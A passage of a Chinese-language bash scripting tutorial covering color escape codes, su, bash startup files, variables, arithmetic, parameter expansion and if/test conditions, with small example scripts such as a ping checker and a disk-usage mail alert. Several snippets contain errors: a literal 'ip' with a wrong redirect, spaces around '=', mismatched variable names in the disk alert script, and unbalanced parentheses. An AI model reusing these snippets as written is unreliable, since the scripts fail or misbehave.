class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33mThis is a yellow"</span></span><br><span class="line"><span class="comment"># 0m 恢复颜色</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"no color"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 常用： 前面变色之后，  后面紧跟：\e[0m 不变色(后面的内容就正常了)</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;31mThis is a red text. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"no color again"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 背景色(40-47)</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;41mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;42mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;43mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;44mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;45mThis is a red text background coloe. \e[0m"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf     也是，不过是加了输出格式</span></span><br></pre></td></tr></table></figure><p><strong>10.切换用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换用户尽量加  -</span></span><br><span class="line">su - xxx   <span class="comment"># 加横线， shell的环境也跟随改变 （login shell） ； 执行的是前四个: bashrc和profile</span></span><br><span class="line">su xxx     <span class="comment"># 不加横线，当前环境还是当前的    ()             ； 执行的是两个bashrc文件</span></span><br></pre></td></tr></table></figure><p><strong>11.关于bash的文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 关于bash的文件：</span></span><br><span class="line"><span class="comment"># 系统级别    来到shell时候执行</span></span><br><span class="line">/etc/profile</span><br><span class="line">/etc/bashrc</span><br><span class="line"><span class="comment"># 用户级别    来到shell时候执行</span></span><br><span class="line">~/.bashrc</span><br><span class="line">~/.profile</span><br><span class="line"><span class="comment"># 离开shell时候执行</span></span><br><span class="line">~/.bash_logout</span><br><span class="line">~/.bash_history</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改用户的shell</span></span><br><span class="line">usermod -s /bin/bash xps    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面两个</span></span><br><span class="line"><span class="comment"># login shell</span></span><br><span class="line"><span class="comment"># nologin shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line"><span class="comment"># /sbin/nologin</span></span><br></pre></td></tr></table></figure><p><strong>12.其他</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shift使位置参数向左移动，默认移动1位，可以使用shift2</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$#</span> -ne 0 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> sum+=<span class="variable">$i</span></span><br><span class="line"><span class="built_in">shift</span></span><br><span class="line"><span class="comment"># shift 2</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$sum</span>"</span></span><br></pre></td></tr></table></figure><h4 id="二-变量"><a href="#二-变量" class="headerlink" title="二.变量"></a>二.变量</h4><h5 id="位置变量"><a href="#位置变量" class="headerlink" title="位置变量"></a>位置变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">脚本执行时，后面的第几个参数   <span class="variable">$1</span> 后面第一个参数      <span class="variable">$2</span>  <span class="variable">$3</span>    <span class="variable">$&#123;10&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 比如下面的例子;</span></span><br><span class="line"><span class="comment"># bash test.sh 111 222 333</span></span><br><span class="line">ping -c1 <span class="variable">$1</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]           <span class="comment"># 如果`上一条命令`返回值等于0(正常执行)   -eq</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span> is up"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span> is down"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h5 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$0</span>    <span class="comment"># 脚本名</span></span><br><span class="line">$*    <span class="comment"># 所有的参数</span></span><br><span class="line"><span class="variable">$@</span>    <span class="comment"># 所有的参数</span></span><br><span class="line"><span class="variable">$#</span>    <span class="comment"># 参数的个数</span></span><br><span class="line">$$    <span class="comment"># 当前进程的PID         echo $$</span></span><br><span class="line">$!    <span class="comment"># 上一个`后台`进程的PID</span></span><br><span class="line">$?    <span class="comment"># 上一个命令的返回值（0为成功）</span></span><br></pre></td></tr></table></figure><p>ping 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果用户没有加参数</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"usage: file `basename <span class="variable">$0</span>`  need parmter"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>如果是文件  -f</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  第一个参数如果不是文件</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$1</span> ];<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"not a file"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># 第一个参数是文件，从中读取ip然后ping</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> `cat <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    ping -c1 ip $&gt;/dev/null</span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span>          </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># basename    始终显示路径最后一个文件</span></span><br><span class="line"><span class="comment"># dirname    始终显示路径前面目录的名字</span></span><br></pre></td></tr></table></figure><h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><p>export</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在系统配置中用的多</span></span><br><span class="line"><span class="comment"># 例如：自己添加环境变量：到/etc/profile</span></span><br><span class="line">PATH=<span class="variable">$PATH</span>:/new/bin</span><br><span class="line"><span class="built_in">export</span> PATH</span><br><span class="line"><span class="comment"># 然后sourcess</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> UID</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$USER</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$HISTORY</span>      <span class="comment">#历史记录命令默认记录1000条</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有的环境变量：   </span></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消环境变量：   </span></span><br><span class="line"><span class="built_in">unset</span> 变量名</span><br></pre></td></tr></table></figure><h5 id="自定义变量"><a href="#自定义变量" class="headerlink" title="自定义变量"></a>自定义变量</h5><p>作用范围：<code>当前shell中</code>生效(<code>a.sh</code>或<code>bash a.sh</code>)， 子shell中不行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## 转为环境变量 export  (在一个脚本文件中export， 在另一个脚本中就可以获取了)</span></span><br><span class="line"><span class="built_in">export</span> ip1</span><br><span class="line"></span><br><span class="line"><span class="comment">## ps: 自己没必要定义环境变量</span></span><br><span class="line">F1: 先 .test.sh    再<span class="built_in">echo</span> <span class="variable">$ip1</span></span><br><span class="line">F2: 或者在一个脚本中引用加载另外一个脚本(./test.sh)，后面就可以用了（没必要在每个文件中都定义一遍变量）</span><br></pre></td></tr></table></figure><h5 id="变量的赋值"><a href="#变量的赋值" class="headerlink" title="变量的赋值"></a>变量的赋值</h5><p>1.显式赋值 （变量要以字母或者下划线开头，数字不可以开头）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 常规赋值</span></span><br><span class="line"><span class="comment"># shell中没有数据类型，都是字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 命令替换, 先把这个命令执行一遍再赋值: 反引号 ` `,   $()</span></span><br><span class="line">today = `date + %F`</span><br></pre></td></tr></table></figure><p>2.read读取赋值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">## -p提示信息。-t等待时间。-n只要前面几个字符</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># read -p "提示信息： "  变量名</span></span><br><span class="line"><span class="comment"># read -t 5 -p "提示信息： "  变量名</span></span><br><span class="line"><span class="comment"># read -n 2  变量名</span></span><br><span class="line"><span class="comment"># read 可以同时跟多个变量。空格隔开，直接一次性赋值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"输入姓名，年龄，性别[e.g zhangsan 20 m]： "</span> name age gender</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"your name: <span class="variable">$name</span>, your age <span class="variable">$age</span>, your gender <span class="variable">$gender</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 注意事项：</span></span><br><span class="line"><span class="string">""</span>   <span class="comment"># 弱引用(里面可以放变量$ip)</span></span><br><span class="line"><span class="string">''</span>   <span class="comment"># 强引用（里面不能引用变量,会原样输出）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 命令替换：  `` 等价于 $(), 里面的命令会先执行</span></span><br></pre></td></tr></table></figure><h5 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h5><blockquote><p>变量赋值，等号两边不能有空格</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c1 <span class="variable">$ip</span> &amp;&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up"</span> || <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down"</span></span><br></pre></td></tr></table></figure><h5 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 引用</span></span><br><span class="line">1. $变量</span><br><span class="line">2. <span class="variable">$&#123;变量&#125;</span>   <span class="comment"># 大括号简单理解为：防止歧义</span></span><br></pre></td></tr></table></figure><h5 id="变量的运算"><a href="#变量的运算" class="headerlink" title="变量的运算"></a>变量的运算</h5><blockquote><p>使用场景：内存使用, ping次数等 … … </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1.整数运算    90%以上</span></span><br><span class="line"><span class="comment"># 方法1：  expr        +   -    \*   /   %</span></span><br><span class="line">expr 1+2</span><br><span class="line">expr <span class="variable">$num1</span> + <span class="variable">$num2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：  $(())       +   -   *   /     %          </span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="variable">$num1</span>+<span class="variable">$num2</span>))</span><br><span class="line"><span class="built_in">echo</span> $((num1+num2))</span><br><span class="line"><span class="built_in">echo</span> $((5-3*2))</span><br><span class="line"><span class="built_in">echo</span> $(((5-3)*2))</span><br><span class="line"><span class="built_in">echo</span> $(((2**3))</span><br><span class="line"><span class="built_in">echo</span> $(((1+2));<span class="built_in">echo</span> <span class="variable">$sum</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：  $[]         +  -  *  /  %</span></span><br><span class="line"><span class="built_in">echo</span> $[5+2]                  </span><br><span class="line"><span class="built_in">echo</span> $[5**2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法4：  let       使用最多</span></span><br><span class="line"><span class="built_in">let</span> sum=2+3;<span class="built_in">echo</span> <span class="variable">$sum</span></span><br><span class="line"><span class="built_in">let</span> i++;<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 2.小数运算</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2*4"</span>|bc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2^4"</span>|bc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"scale=2;6/4"</span>|bc</span><br><span class="line">awk <span class="string">'BEGIN&#123;print 1/2&#125;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"print 5.0/2"</span>|python</span><br></pre></td></tr></table></figure><h5 id="变量的删除-替换"><a href="#变量的删除-替换" class="headerlink" title="变量的删除/替换"></a>变量的删除/替换</h5><blockquote><p>使用场景：让你输入值但是你没输入，我就给你一个默认值</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 删除</span></span><br><span class="line">url=<span class="string">"www.baidu.com"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#url&#125;</span>   <span class="comment"># 从前往后，井号，输出长度， 最短匹配</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url#www.&#125;</span>   <span class="comment">#  把前面部分删除</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url#*baidu.&#125;</span>    <span class="comment">#  把前面部分删除   * </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url##*.&#125;</span>       <span class="comment"># 从前往后，贪婪匹配，最长匹配</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%.&#125;</span>         <span class="comment"># 从后往前, 最短匹配</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%%.&#125;</span>        <span class="comment"># 从后往前，贪婪匹配</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 切片</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url：0:5&#125;</span>   <span class="comment"># </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url：5:5&#125;</span>   <span class="comment"># 从5开始，拿5个</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url：5:&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 变量内容的替换</span></span><br><span class="line">url=<span class="string">"www.baidu.com"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url/baidu/sina&#125;</span>   <span class="comment"># 百度换成新浪</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url/n/N&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url//n/N&#125;</span>  <span class="comment"># 贪婪匹配</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## $&#123;变量名-新变量值&#125;</span></span><br><span class="line"><span class="comment"># 替代(没赋值；如果变量之前有值即便是空值就不能替代)   </span></span><br><span class="line"><span class="built_in">unset</span> var1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var1-aaa&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## $&#123;变量名:-新变量值&#125;</span></span><br><span class="line"><span class="comment"># 没赋值或者为空，就可以替代；如果变量之前有值就不能替代</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 拓展：</span></span><br><span class="line"><span class="variable">$&#123;变量名+新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名:+新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名=新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名:=新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名?新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名:?新变量值&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 自增自减</span></span><br><span class="line"><span class="comment"># i++</span></span><br><span class="line"><span class="comment"># ++i</span></span><br><span class="line"><span class="comment">## 对变量值的影响： 没啥区别</span></span><br><span class="line"><span class="comment">## 对表达式值的影响： ++i 先自增再赋值，  i++ 先赋值在自增</span></span><br></pre></td></tr></table></figure><h4 id="三-条件判断"><a href="#三-条件判断" class="headerlink" title="三.条件判断"></a>三.条件判断</h4><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><blockquote><p>shell中最核心的</p></blockquote><p><strong>1.文件测试 [操作符 + 文件或目录]</strong>   </p><p>命令格式1：<code>test</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如判断文件是否存在，如果存在就备份(概念版)</span></span><br><span class="line">back_dir=/var/mysql_bak</span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">test</span> -d <span class="variable">$back_dir</span>;<span class="keyword">then</span>     <span class="comment"># 条件测试语句test， 如果不是目录或者这个目录不存在</span></span><br><span class="line">mkdir -p <span class="variable">$back_dir</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"开始备份..."</span></span><br><span class="line"><span class="comment"># 执行 bash -vx test.sh        -vx可以看详细执行过程</span></span><br></pre></td></tr></table></figure><p>命令格式2： <code>[ -d /home ]</code>    方括号取代了test(注意有空格)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># man test， 帮助文档相同。 前半边是命令[,  后半边]只是一个符号</span></span><br><span class="line">back_dir=/var/mysql_bak</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$back_dir</span> ];<span class="keyword">then</span>     <span class="comment"># 如果不是目录或者这个目录不存在</span></span><br><span class="line">mkdir -p <span class="variable">$back_dir</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"开始备份..."</span></span><br></pre></td></tr></table></figure><p>命令格式3：  <code>[[ -d /home ]]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [ -e dir|file ]</span></span><br><span class="line">-d 是否是目录</span><br><span class="line">-f 是否为文件</span><br><span class="line">-r `当前用户`是否对该文件有读权限</span><br><span class="line">-w</span><br><span class="line">-l  是否是链接</span><br><span class="line">-b  是否为设备文件</span><br><span class="line">-c  是否为字符设备</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[ ! -d /cc ] &amp;&amp; mkdir /cc   <span class="comment"># 当前不是一个目录或者目录如果不存在，就创建</span></span><br><span class="line">[ -d /ccc ] || mkdir /ccc   <span class="comment"># 当前是一个目录或者目录如果存在，就不创建</span></span><br></pre></td></tr></table></figure><p><strong>2.数值比较</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [ 1 -gt 10 ]  大于</span></span><br><span class="line">-lt  小于</span><br><span class="line">-eq  等于</span><br><span class="line">-ne  不等于</span><br><span class="line">-ge  &gt;=</span><br><span class="line">-le  &lt;=</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装软件，先判断是否为root用户</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$UID</span> -ne 0 ];<span class="keyword">then</span>         <span class="comment"># $UID不等于0，代表不是root用户(数值比较)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"你没有权限!"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">apt install apache2</span><br></pre></td></tr></table></figure><p>例子：用户输入(read)用户名，创建这个用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">"input the user name:  "</span> user</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span>     <span class="comment"># 如果用户存在</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>例子2： 如果磁盘是使用量超过90%， 就报警</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep'/$' 是提取根分区， $(NF) 是倒数第一列， awk是以什么分割</span></span><br><span class="line"></span><br><span class="line">dick_use=`df -Th |grep<span class="string">'/$'</span>|awk <span class="string">'&#123;print $(NF-1)&#125;'</span>|awk -F<span class="string">"%"</span> <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line">mail_user=alice</span><br><span class="line">warn_file=/tmp/disk_warn.txt</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$dick_use</span> -gt 90 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"`date +%F:%H` disk: <span class="variable">$&#123;dick_use&#125;</span>%"</span> &gt;warn_file</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$disk_warn</span> ];<span class="keyword">then</span>      <span class="comment"># 将报错文件发送给邮件用户</span></span><br><span class="line">mail -s <span class="string">"disk  warning..."</span> <span class="variable">$mail_user</span> &lt; <span class="variable">$dick_use</span>     <span class="comment"># |mail -s 邮件主题</span></span><br><span class="line">rm -rf <span class="variable">$disk_warn</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以用crontab，定时执行（crontab -e会把所有的任务清除）</span></span><br><span class="line"><span class="comment"># 换行是 \</span></span><br></pre></td></tr></table></figure><p><strong>3.字符串比较</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 